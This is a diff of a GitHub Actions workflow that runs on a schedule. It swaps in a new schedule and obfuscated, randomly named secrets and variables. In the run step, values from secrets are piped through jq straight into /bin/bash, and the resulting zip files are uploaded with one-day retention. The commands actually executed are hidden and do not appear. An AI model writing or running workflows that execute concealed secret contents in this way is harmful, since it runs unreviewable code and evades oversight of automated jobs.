@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '14 5,11,17,23 * * *'
+    - cron: '16 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,17 +17,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          t658: ${{ secrets.t658 }}
+          cujgw3: ${{ secrets.cujgw3 }}
         run: |
-          printf '%s' "$t658" | jq -r .lkwg7236 | /bin/bash
-          printf '%s' "$gbgu92411" | jq -r .efamp7 | /bin/bash
-          printf '%s' "$t6848" | jq -r .anel9813 | /bin/bash
-          printf '%s' "$s12" | jq -r .a0466 | /bin/bash
-          printf '%s' "$u1878" | jq -r .ele97044 | /bin/bash
+          printf '%s' "$cujgw3" | jq -r .bg2849 | /bin/bash
+          echo $txev19660 | jq -r .yr7952 | /bin/bash
+          echo $mgc0697 | jq -r .wemf095 | /bin/bash
+          echo $ryqva368 | jq -r .zrl6785 | /bin/bash
+          printf '%s' "$bhp641" | jq -r .epl38 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: E9wo1ual
+          name: l88zehOp
           path: "*.zip"
           retention-days: 1
